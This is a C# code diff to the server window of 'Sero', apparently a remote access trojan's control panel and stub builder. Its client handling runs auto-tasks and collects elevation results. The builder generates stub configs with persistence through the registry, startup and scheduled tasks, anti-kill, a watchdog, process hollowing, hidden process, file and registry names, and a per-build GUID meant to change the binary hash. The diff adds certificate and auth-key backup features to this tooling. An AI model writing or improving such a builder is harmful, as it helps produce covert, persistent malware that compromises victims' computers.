@@ -17,6 +17,7 @@ public partial class ServerWindow : Window
     private TlsServer? _server;
     private DateTime _serverStartedAt;
     private readonly DispatcherTimer _dashTimer;
+    private readonly DispatcherTimer _uptimeTimer;
     private readonly System.Collections.ObjectModel.ObservableCollection<Data.AutoTaskEntry> _autoTasks = new();
     private Net.SeroDiscordRPC? _discordRpc;
     private readonly ObservableCollection<ConnectedClient> _onlineClients = new();
@@ -39,6 +40,9 @@ public partial class ServerWindow : Window
         _dashTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
         _dashTimer.Tick += (_, _) => RefreshDashboard();
 
+        _uptimeTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
+        _uptimeTimer.Tick += (_, _) => RefreshUptime();
+
         Loaded += (_, _) =>
         {
             GridClients.ItemsSource = _onlineClients;
@@ -52,7 +56,6 @@ public partial class ServerWindow : Window
             InitHollowTargets();
 
             // First launch: cert + auth key setup
-            bool needsAuthKey = string.IsNullOrEmpty(BldAuthKey.Text.Trim());
             bool needsCert;
             try
             {
@@ -64,7 +67,8 @@ public partial class ServerWindow : Window
             if (needsCert)
                 ShowCertSetupDialog();
 
-            if (needsAuthKey)
+            // Re-check AFTER dialog — importing a .sero may have restored the auth key
+            if (string.IsNullOrEmpty(BldAuthKey.Text.Trim()))
             {
                 var bytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(24);
                 BldAuthKey.Text = Convert.ToBase64String(bytes);
@@ -148,8 +152,10 @@ public partial class ServerWindow : Window
         {
             _server.Stop();
             _dashTimer.Stop();
+            _uptimeTimer.Stop();
             _discordRpc?.Stop();
             _discordRpc = null;
+            TxtPort.IsEnabled = true;
             SetServerStatus(false);
             BtnStartStop.Content = "START";
             _server = null;
@@ -165,6 +171,8 @@ public partial class ServerWindow : Window
                 return;
             }
 
+            SaveConfig();
+
             try
             {
                 _server = new TlsServer(_store);
@@ -172,8 +180,8 @@ public partial class ServerWindow : Window
                 _server.ClientConnected += c => Dispatcher.BeginInvoke(async () =>
                 {
                     _onlineClients.Add(c);
+                    _clientsDirty = true;
                     UpdateClientCount();
-                    // Execute auto-tasks for new client
                     if (_autoTasks.Count > 0)
                         await ExecuteAutoTasksForClient(c);
                 });
@@ -181,6 +189,7 @@ public partial class ServerWindow : Window
                 {
                     var existing = _onlineClients.FirstOrDefault(x => x.Id == c.Id);
                     if (existing != null) _onlineClients.Remove(existing);
+                    _clientsDirty = true;
                     UpdateClientCount();
                 });
                 _server.ElevationResultReceived += (clientId, data) => Dispatcher.Invoke(() =>
@@ -205,9 +214,11 @@ public partial class ServerWindow : Window
                     _server.MaxConnectedClients = maxClients;
                 _server.Start(port);
                 _serverStartedAt = DateTime.UtcNow;
+                TxtPort.IsEnabled = false;
                 SetServerStatus(true);
                 BtnStartStop.Content = "STOP";
                 _dashTimer.Start();
+                _uptimeTimer.Start();
 
                 // Discord RPC
                 if (SettingsDiscordRPC.IsChecked == true)
@@ -269,31 +280,30 @@ public partial class ServerWindow : Window
         GridAllClients.ItemsSource = new ObservableCollection<ClientRecord>(_store.AllClients.Values.OrderByDescending(r => r.LastSeen));
     }
 
+    private void RefreshUptime()
+    {
+        var uptime = DateTime.UtcNow - _serverStartedAt;
+        DashUptime.Text = uptime.TotalHours >= 1
+            ? $"{(int)uptime.TotalHours}h {uptime.Minutes}m {uptime.Seconds:D2}s"
+            : $"{uptime.Minutes}m {uptime.Seconds:D2}s";
+    }
+
     private void RefreshDashboard()
     {
         var online = _server?.ConnectedClients.Count ?? 0;
         var total = _store.AllClients.Count;
-        var uptime = DateTime.UtcNow - _serverStartedAt;
 
         DashOnline.Text = online.ToString();
         DashTotal.Text = total.ToString();
-        DashUptime.Text = uptime.TotalHours >= 1
-            ? $"{(int)uptime.TotalHours}h {uptime.Minutes}m"
-            : $"{uptime.Minutes}m {uptime.Seconds}s";
 
         UpdateClientCount();
 
-        // Only rebuild grids when something changed
+        // Only rebuild grids when something changed (add/remove/tag)
         if (_clientsDirty)
         {
             _clientsDirty = false;
             RefreshClients();
             RefreshAllClients();
-        }
-        else
-        {
-            // Just update ping values without rebuilding
-            GridClients.Items.Refresh();
         }
     }
 
@@ -801,11 +811,14 @@ public partial class ServerWindow : Window
         var useMutex = BldUseMutex.IsChecked == true ? "true" : "false";
         var mutexName = BldUseMutex.IsChecked == true ? BldMutex.Text.Trim().Replace("\\", "\\\\") : "";
 
+        // Escape for C# string literal — prevents quote injection in generated Config.cs
+        static string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
+
         return $@"namespace SeroStub;
 
 internal static class Config
 {{
-    public const string Host = ""{GetPrimaryHost()}"";
+    public const string Host = ""{Esc(GetPrimaryHost())}"";
     public const int Port = {port};
     public const bool UseMutex = {useMutex};
     public const string MutexName = ""{mutexName}"";
@@ -818,15 +831,15 @@ internal static class Config
     public const bool PersistRegistry = {(BldPersistRegistry.IsChecked == true ? "true" : "false")};
     public const bool PersistStartup = {(BldPersistStartup.IsChecked == true ? "true" : "false")};
     public const bool PersistTask = {(BldPersistTask.IsChecked == true ? "true" : "false")};
-    public const string PersistName = ""{installFolder}"";
+    public const string PersistName = ""{Esc(installFolder)}"";
 
     public const bool AntiKill = {(BldAntiKill.IsChecked == true ? "true" : "false")};
     public const bool EnableWatchdog = {(BldWatchdog.IsChecked == true ? "true" : "false")};
     public const bool EnableHollowing = {(BldHollowing.IsChecked == true ? "true" : "false")};
-    public const string HollowTarget = ""{GetHollowTarget()}"";
+    public const string HollowTarget = ""{Esc(GetHollowTarget())}"";
 
-    public const string AuthKey = ""{BldAuthKey.Text.Trim()}"";
-    public const string CertHash = ""{BldCertHash.Text.Trim()}"";
+    public const string AuthKey = ""{Esc(BldAuthKey.Text.Trim())}"";
+    public const string CertHash = ""{Esc(BldCertHash.Text.Trim())}"";
 
     // Unique per build — changes the compiled binary hash even with identical settings
     public const string BuildId = ""{Guid.NewGuid():N}"";
@@ -834,11 +847,11 @@ internal static class Config
     public const int ReconnectDelayMs = {reconnect};
     public const int HeartbeatIntervalMs = 10000;
 
-    public const string ClientIdPrefix = ""{BldClientIdPrefix.Text.Trim()}"";
+    public const string ClientIdPrefix = ""{Esc(BldClientIdPrefix.Text.Trim())}"";
 
-    public const string HiddenProcessName = ""{fileNameNoExt.ToLowerInvariant()}"";
-    public const string HiddenFileName = ""{installFileName.ToLowerInvariant()}"";
-    public const string HiddenRegKey = ""{installFolder}"";
+    public const string HiddenProcessName = ""{Esc(fileNameNoExt.ToLowerInvariant())}"";
+    public const string HiddenFileName = ""{Esc(installFileName.ToLowerInvariant())}"";
+    public const string HiddenRegKey = ""{Esc(installFolder)}"";
 }}
 ";
     }
@@ -1144,11 +1157,15 @@ internal static class Config
 
             await File.WriteAllTextAsync(csprojPath, csproj);
 
-            // Clean build cache to ensure version info is regenerated
+            // Clean build cache (offloaded — can be slow on large NativeAOT obj dirs)
             var binDir = Path.Combine(stubDir, "bin");
             var objDir = Path.Combine(stubDir, "obj");
-            try { if (Directory.Exists(binDir)) Directory.Delete(binDir, true); } catch { }
-            try { if (Directory.Exists(objDir)) Directory.Delete(objDir, true); } catch { }
+            TxtBuildStatus.Text = "Cleaning cache...";
+            await Task.Run(() =>
+            {
+                try { if (Directory.Exists(binDir)) Directory.Delete(binDir, true); } catch { }
+                try { if (Directory.Exists(objDir)) Directory.Delete(objDir, true); } catch { }
+            });
 
             // Choose build mode: NativeAOT for hollowing, SingleFile otherwise
             var useAot = BldHollowing.IsChecked == true;
@@ -1361,31 +1378,33 @@ internal static class Config
             return;
         }
 
-        TxtPortResult.Text = $"Checking {ip}:{port} from outside...";
+        if (ip is "127.0.0.1" or "localhost" or "::1" or "0.0.0.0" or "")
+        {
+            TxtPortResult.Text = "Cannot check localhost.";
+            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
+            return;
+        }
+
+        TxtPortResult.Text = $"Checking {ip}:{port}...";
         TxtPortResult.Foreground = (Brush)FindResource("DimBrush");
 
         try
         {
-            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(12) };
-            // hackertarget returns "open" or "closed" — external check, no hairpin NAT false positives
-            var resp = await http.GetStringAsync($"https://api.hackertarget.com/nmap/?q={ip}&port={port}");
+            using var tcp = new System.Net.Sockets.TcpClient();
+            var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
+            await tcp.ConnectAsync(ip, port, cts.Token);
 
-            bool open = resp.Contains("/tcp") && resp.Contains("open");
-
-            if (open)
-            {
-                TxtPortResult.Text = $"Port {port} is OPEN on {ip} (reachable from internet)";
-                TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0x1b, 0x8a, 0x2e));
-            }
-            else
-            {
-                TxtPortResult.Text = $"Port {port} is CLOSED on {ip} (not reachable from internet)";
-                TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
-            }
+            TxtPortResult.Text = $"Port {port} is OPEN on {ip}";
+            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0x1b, 0x8a, 0x2e));
         }
-        catch (Exception ex)
+        catch (OperationCanceledException)
         {
-            TxtPortResult.Text = $"Check failed: {ex.Message}";
+            TxtPortResult.Text = $"Port {port} is CLOSED or unreachable on {ip} (timeout)";
+            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
+        }
+        catch
+        {
+            TxtPortResult.Text = $"Port {port} is CLOSED on {ip} (connection refused)";
             TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
         }
     }
@@ -1703,19 +1722,21 @@ internal static class Config
             TextWrapping = TextWrapping.Wrap,
         });
 
-        var btnGen = new System.Windows.Controls.Button
+        var btnImport = new System.Windows.Controls.Button
         {
-            Content = "Generate new certificate and save it…",
+            Content = "Import backup or certificate (.sero / .pfx)…",
             Margin = new Thickness(0, 0, 0, 8),
             Padding = new Thickness(10, 6, 10, 6),
             HorizontalAlignment = HorizontalAlignment.Stretch,
         };
-        var btnImp = new System.Windows.Controls.Button
+        var btnGen = new System.Windows.Controls.Button
         {
-            Content = "Import an existing certificate (.pfx)…",
+            Content = "Generate new certificate and save it…",
             Padding = new Thickness(10, 6, 10, 6),
             HorizontalAlignment = HorizontalAlignment.Stretch,
         };
+
+        btnImport.Click += (_, _) => ImportCertOrBackup(() => dlg.Close());
 
         btnGen.Click += (_, _) =>
         {
@@ -1739,43 +1760,104 @@ internal static class Config
             catch (Exception ex) { Log($"[!] Cert generation failed: {ex.Message}"); }
         };
 
-        btnImp.Click += (_, _) =>
-        {
-            var open = new Microsoft.Win32.OpenFileDialog
-            {
-                Filter = "PFX Certificate (*.pfx)|*.pfx",
-                Title = "Select your .pfx certificate"
-            };
-            if (open.ShowDialog() != true) return;
+        sp.Children.Add(btnImport);
+        sp.Children.Add(btnGen);
+        dlg.Content = sp;
+        dlg.ShowDialog();
+    }
 
-            try
+    private void ExportBackup_Click(object sender, RoutedEventArgs e)
+    {
+        try
+        {
+            var authKey = BldAuthKey.Text.Trim();
+            if (string.IsNullOrEmpty(authKey))
             {
-                try { Net.CertificateHelper.ImportCertificate(open.FileName, null); }
+                MessageBox.Show("Generate or set an auth key in the Builder tab before exporting a backup.",
+                    "Sero — No Auth Key", MessageBoxButton.OK, MessageBoxImage.Warning);
+                return;
+            }
+
+            var dialog = new Microsoft.Win32.SaveFileDialog
+            {
+                Filter = "Sero Backup (*.sero)|*.sero",
+                FileName = "sero_backup.sero",
+                Title = "Export Server Backup (cert + auth key)"
+            };
+            if (dialog.ShowDialog() != true) return;
+
+            CertificateHelper.ExportServerBackup(dialog.FileName, authKey);
+            Log($"[+] Server backup exported to {dialog.FileName}");
+            TxtStatusBar.Text = "Server backup exported.";
+            MessageBox.Show(
+                $"Backup exporté :\n{dialog.FileName}\n\nContient le certificat TLS et la clé d'auth.\nImportez ce fichier sur une autre machine pour que les clients reconnectent.",
+                "Sero — Backup réussi", MessageBoxButton.OK, MessageBoxImage.Information);
+        }
+        catch (Exception ex)
+        {
+            Log($"[!] Backup export failed: {ex.Message}");
+            MessageBox.Show($"Export failed: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
+        }
+    }
+
+    private void ImportBackup_Click(object sender, RoutedEventArgs e)
+        => ImportCertOrBackup(null);
+
+    private void ImportCertOrBackup(Action? onSuccess)
+    {
+        var open = new Microsoft.Win32.OpenFileDialog
+        {
+            Filter = "Sero Backup or Certificate (*.sero;*.pfx)|*.sero;*.pfx|All Files (*.*)|*.*",
+            Title = "Import server backup (.sero) or certificate (.pfx)"
+        };
+        if (open.ShowDialog() != true) return;
+
+        try
+        {
+            var path = open.FileName;
+            var ext = System.IO.Path.GetExtension(path).ToLowerInvariant();
+
+            if (ext == ".sero")
+            {
+                var restoredKey = CertificateHelper.ImportServerBackup(path);
+                try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }
+
+                if (!string.IsNullOrEmpty(restoredKey))
+                {
+                    BldAuthKey.Text = restoredKey;
+                    BldAuthKey.IsReadOnly = true;
+                    SaveConfig();
+                }
+                Log("[+] Server backup restored (cert + auth key).");
+                TxtStatusBar.Text = "Backup restored.";
+                MessageBox.Show(
+                    "Backup restauré.\nCertificat + clé d'auth restaurés.\nRedémarrez le serveur pour que les clients reconnectent.",
+                    "Sero — Import réussi", MessageBoxButton.OK, MessageBoxImage.Information);
+            }
+            else
+            {
+                try { CertificateHelper.ImportCertificate(path, null); }
                 catch
                 {
                     var pwd = PromptPassword("Ce certificat est protégé par un mot de passe.\nEntrez le mot de passe PFX :");
                     if (pwd == null) return;
-                    Net.CertificateHelper.ImportCertificate(open.FileName, pwd);
+                    CertificateHelper.ImportCertificate(path, pwd);
                 }
-                try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); } catch { }
-                Log("[+] Certificate imported successfully.");
-                dlg.Close();
-                MessageBox.Show("Certificat importé. Le serveur est prêt à démarrer.",
-                    "Sero — Import réussi", MessageBoxButton.OK, MessageBoxImage.Information);
+                try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }
+                Log("[+] Certificate imported.");
+                TxtStatusBar.Text = "Certificate imported.";
+                MessageBox.Show(
+                    "Certificat importé.\nATTENTION : la clé d'auth n'est pas incluse dans un .pfx.\nVérifiez que la clé d'auth dans le Builder correspond à celle de vos stubs.",
+                    "Sero — Import cert", MessageBoxButton.OK, MessageBoxImage.Warning);
             }
-            catch (Exception ex)
-            {
-                Log($"[!] Import failed: {ex.Message}");
-                MessageBox.Show($"Import échoué : {ex.Message}\n\nVérifiez que le fichier est un .pfx valide avec clé privée exportable.",
-                    "Erreur", MessageBoxButton.OK, MessageBoxImage.Error);
-                // Don't close dialog — let user retry or choose Generate instead
-            }
-        };
 
-        sp.Children.Add(btnGen);
-        sp.Children.Add(btnImp);
-        dlg.Content = sp;
-        dlg.ShowDialog();
+            onSuccess?.Invoke();
+        }
+        catch (Exception ex)
+        {
+            Log($"[!] Import failed: {ex.Message}");
+            MessageBox.Show($"Import échoué : {ex.Message}", "Erreur", MessageBoxButton.OK, MessageBoxImage.Error);
+        }
     }
 
     private void ExportCert_Click(object sender, RoutedEventArgs e)
@@ -1786,7 +1868,7 @@ internal static class Config
             {
                 Filter = "PFX Certificate (*.pfx)|*.pfx",
                 FileName = "sero_cert.pfx",
-                Title = "Export TLS Certificate"
+                Title = "Export TLS Certificate (cert only)"
             };
 
             if (dialog.ShowDialog() != true) return;
@@ -1795,8 +1877,8 @@ internal static class Config
             Log($"[+] Certificate exported to {dialog.FileName}");
             TxtStatusBar.Text = "Certificate exported.";
             MessageBox.Show(
-                $"Certificat exporté :\n{dialog.FileName}\n\nAucun mot de passe requis pour l'importer.",
-                "Sero — Export réussi", MessageBoxButton.OK, MessageBoxImage.Information);
+                $"Certificat exporté :\n{dialog.FileName}\n\nATTENTION : Ce fichier ne contient pas la clé d'auth.\nUtilisez 'Backup' pour exporter cert + clé d'auth ensemble.",
+                "Sero — Export cert", MessageBoxButton.OK, MessageBoxImage.Warning);
         }
         catch (Exception ex)
         {
@@ -1886,7 +1968,6 @@ internal static class Config
 
     private void Close_Click(object sender, RoutedEventArgs e)
     {
-        SaveConfig();
         _server?.Stop();
         Application.Current.Shutdown();
     }
